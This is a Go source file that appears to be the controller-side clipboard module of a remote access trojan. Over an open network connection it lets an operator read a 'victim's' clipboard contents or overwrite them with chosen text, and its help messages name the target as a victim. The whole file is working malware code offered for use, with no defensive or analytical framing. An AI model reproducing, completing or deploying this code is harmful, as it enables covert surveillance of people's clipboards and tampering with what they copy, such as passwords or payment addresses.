package clipboard

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func Write(connection net.Conn) (err error) {

	fmt.Print("\bclip_command> ")
	CommandReader := bufio.NewReader(os.Stdin)
	user_command, err := CommandReader.ReadString('\n')
	user_command_raw := strings.TrimSpace(user_command)

	if err != nil {
		fmt.Println("[+] Unable to read command ")
	}
	if user_command_raw == "help" {
		fmt.Println("\n[+] stop \t:\t cancels the code execution")
		fmt.Println("\n[+] read \t:\t reads the clipboard of victim")
		fmt.Println("\n[+] write\t:\t Entered msg will get written to victims clipboard")
	}
	if user_command_raw == "stop" {
		ntes, err := connection.Write([]byte(user_command))
		if err != nil {
			panic(err)
		}
		fmt.Println("[+]", ntes, "bytes written")

	}
	if user_command_raw == "read" {
		nbytes, err := connection.Write([]byte(user_command))
		fmt.Println("[+]", nbytes, "bytes written")
		CommandReader := bufio.NewReader(connection)
		txt_raw, err := CommandReader.ReadString('\n')
		if err != nil {
			panic(err)
		}
		txt := strings.TrimSpace(txt_raw)
		fmt.Println("Clipboard of victim : " + txt)

	}
	if user_command_raw == "write" {
		nytes, err := connection.Write([]byte(user_command))
		if err != nil {
			panic(err)
		}
		fmt.Println("[+]", nytes, "bytes written\n")

		fmt.Print("\bur msg :")
		CommandReader := bufio.NewReader(os.Stdin)
		user_command, err := CommandReader.ReadString('\n')
		nbytes, err := connection.Write([]byte(user_command))
		if err != nil {
			panic(err)
		}
		fmt.Println("[+]", nbytes, "bytes written\n")
	}
	return
}
